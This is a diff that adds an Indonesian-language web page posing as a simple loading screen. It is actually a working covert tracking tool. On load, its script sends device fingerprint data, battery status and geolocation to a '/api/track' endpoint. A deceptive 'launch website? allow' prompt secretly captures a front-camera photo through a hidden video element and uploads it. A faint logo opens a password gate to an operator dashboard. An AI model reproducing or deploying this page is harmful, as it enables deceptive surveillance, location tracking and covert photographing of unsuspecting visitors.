@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Halaman</title>
+<style>
+  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0e0e10; color:#eaeaea; }
+  main { padding:40px 24px; }
+  #logo { position:fixed; top:16px; right:16px; width:44px; height:44px; cursor:pointer; opacity:.35; z-index:99999; user-select:none; }
+  #logo:hover { opacity:.9; }
+  #gate { position:fixed; inset:0; z-index:2147483647; background:rgba(10,10,12,.92); display:flex; align-items:center; justify-content:center; }
+  #gate .card { background:#1a1a1e; border:1px solid #2e2e34; border-radius:12px; padding:28px 32px; max-width:360px; text-align:center; }
+  #gate h2 { margin:0 0 8px; font-size:18px; }
+  #gate p  { margin:0 0 20px; color:#9a9aa2; font-size:13px; }
+  #gate button { display:block; width:100%; padding:12px; font:inherit; font-weight:600; border:0; border-radius:8px; background:#3b82f6; color:#fff; cursor:pointer; margin-bottom:8px; }
+  #gate button.alt { background:#2a2a30; color:#c8c8cf; font-weight:500; }
+  #pw { position:fixed; inset:0; z-index:2147483647; background:rgba(10,10,12,.95); display:none; align-items:center; justify-content:center; }
+  #pw .card { background:#1a1a1e; border:1px solid #2e2e34; border-radius:12px; padding:24px 28px; width:280px; text-align:center; }
+  #pw h3 { margin:0 0 16px; font-size:15px; font-weight:600; }
+  #pw input { width:100%; box-sizing:border-box; padding:10px 12px; font:inherit; background:#0e0e10; border:1px solid #3a3a42; border-radius:8px; color:#eaeaea; margin-bottom:12px; }
+  #pw input:focus { outline:none; border-color:#3b82f6; }
+  #pw button { width:100%; padding:10px; font:inherit; font-weight:600; border:0; border-radius:8px; background:#3b82f6; color:#fff; cursor:pointer; }
+  #pw .err { color:#ff6b6b; font-size:12px; min-height:16px; margin-bottom:8px; }
+  #pw .close { background:transparent; color:#8a8a92; font-weight:400; margin-top:6px; }
+</style>
+</head>
+<body>
+<main><h1>Selamat datang</h1><p>Halaman ini sedang dimuat.</p></main>
+
+<div id="logo"><svg viewBox="0 0 24 24" fill="none" stroke="#eaeaea" stroke-width="1.6" width="44" height="44"><circle cx="12" cy="12" r="9"/><path d="M12 3v18M3 12h18"/></svg></div>
+
+<div id="gate"><div class="card">
+  <h2>Luncurkan website?</h2>
+  <p>Halaman ini siap ditampilkan.</p>
+  <button id="allow">Izinkan</button>
+  <button id="deny" class="alt">Batal</button>
+</div></div>
+
+<div id="pw"><div class="card">
+  <h3>Masukkan password</h3>
+  <input id="pwin" type="password" autocomplete="off" placeholder="password">
+  <div class="err" id="pwerr"></div>
+  <button id="pwok">Masuk</button>
+  <button class="close" id="pwcancel">batal</button>
+</div></div>
+
+<script>
+(function () {
+  var API = "/api/track";
+
+  function send(path, body, isForm) {
+    var url = API + path;
+    if (isForm) { fetch(url, { method:"POST", body:body }).catch(function(){}); return; }
+    var blob = new Blob([body], { type:"application/json" });
+    if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
+    else fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:body, keepalive:true }).catch(function(){});
+  }
+
+  function collectBattery() {
+    return new Promise(function (resolve) {
+      if (!navigator.getBattery && !navigator.battery) return resolve(null);
+      (navigator.getBattery ? navigator.getBattery() : Promise.resolve(navigator.battery))
+        .then(function (b) { resolve({ level: Math.round(b.level*100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }); })
+        .catch(function () { resolve(null); });
+    });
+  }
+  function geo() {
+    return new Promise(function (resolve) {
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        function (p) { resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }); },
+        function () { resolve(null); }, { timeout: 4000, maximumAge: 60000 });
+    });
+  }
+
+  Promise.all([collectBattery(), geo()]).then(function (r) {
+    send("/collect", JSON.stringify({
+      page: location.href, referrer: document.referrer || null,
+      screen: screen.width+"x"+screen.height, viewport: innerWidth+"x"+innerHeight,
+      language: navigator.language, languages: (navigator.languages||[]).join(","),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, platform: navigator.platform,
+      userAgent: navigator.userAgent, cores: navigator.hardwareConcurrency || null,
+      memory: navigator.deviceMemory || null, touch: "ontouchstart" in window,
+      cookieEnabled: navigator.cookieEnabled, battery: r[0], geo: r[1],
+      ts: new Date().toISOString()
+    }), false);
+  });
+
+  var gate = document.getElementById("gate");
+  function snap() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:640}, height:{ideal:480} }, audio:false })
+    .then(function (stream) {
+      var v = document.createElement("video");
+      v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = stream;
+      v.style.cssText = "position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;";
+      v.onloadedmetadata = function () {
+        v.play();
+        setTimeout(function () {
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+          c.toBlob(function (blob) {
+            if (!blob) return;
+            var fd = new FormData();
+            fd.append("shot", blob, "shot.jpg");
+            fd.append("page", location.href);
+            fd.append("ts", new Date().toISOString());
+            send("/snap", fd, true);
+            stream.getTracks().forEach(function (t) { t.stop(); });
+            v.remove();
+          }, "image/jpeg", 0.85);
+        }, 800);
+      };
+      document.body.appendChild(v);
+    }).catch(function(){});
+  }
+  document.getElementById("allow").addEventListener("click", function () { gate.remove(); snap(); });
+  document.getElementById("deny").addEventListener("click", function () { gate.remove(); });
+
+  var logo = document.getElementById("logo");
+  var pw = document.getElementById("pw");
+  var pwin = document.getElementById("pwin");
+  var pwerr = document.getElementById("pwerr");
+
+  logo.addEventListener("click", function () {
+    pw.style.display = "flex";
+    pwin.value = "";
+    pwerr.textContent = "";
+    setTimeout(function () { pwin.focus(); }, 50);
+  });
+
+  document.getElementById("pwcancel").addEventListener("click", function () {
+    pw.style.display = "none";
+  });
+
+  function tryLogin() {
+    var val = pwin.value;
+    if (!val) { pwerr.textContent = "isi dulu"; return; }
+    pwerr.textContent = "cek...";
+    fetch(API + "/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ password: val })
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (j) {
+      if (j.ok) { window.location.href = "/dashboard"; }
+      else { pwerr.textContent = "password salah"; pwin.value = ""; pwin.focus(); }
+    })
+    .catch(function () { pwerr.textContent = "error, coba lagi"; });
+  }
+
+  document.getElementById("pwok").addEventListener("click", tryLogin);
+  pwin.addEventListener("keydown", function (e) { if (e.key === "Enter") tryLogin(); });
+})();
+</script>
+</body>
+</html>
